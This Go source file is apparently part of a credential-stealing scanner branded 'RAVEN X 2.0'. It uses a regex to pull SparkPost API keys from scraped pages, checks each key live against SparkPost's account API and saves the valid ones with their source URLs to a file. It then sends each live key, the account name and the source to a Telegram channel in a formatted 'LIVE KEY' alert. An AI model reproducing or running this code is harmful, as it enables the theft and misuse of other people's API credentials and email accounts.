package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"time"
)

var sparkpostPattern = regexp.MustCompile(`(?i)(?:sparkpost[_-]?(?:api[_-]?)?key|SPARKPOST_API_KEY)["'\s:=]+([a-f0-9]{40})`)

func (a *AWSScanner) CheckSparkPost(key, sourceURL string) bool {
	if !a.Config.APIValidation.SparkPost {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, err := http.NewRequest("GET", "https://api.sparkpost.com/api/v1/account", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Authorization", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	req = req.WithContext(ctx)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false
	}

	var res struct {
		Results struct {
			CompanyName string `json:"company_name"`
			Plan        string `json:"plan_volume_per_term"`
		} `json:"results"`
	}
	json.NewDecoder(resp.Body).Decode(&res)
	info := res.Results.CompanyName

	a.logValid("SparkPost", fmt.Sprintf("Key: %s | Account: %s", key, info))
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_sparkpost.txt")
	a.storeValidKeyLimit("SparkPost", key, info)

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
✉️ <b>SPARKPOST LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🏢 <b>Account:</b> %s
🔗 <b>Source:</b> %s
`, key, info, sourceURL)
	go a.sendTelegram(msg)
	return true
}
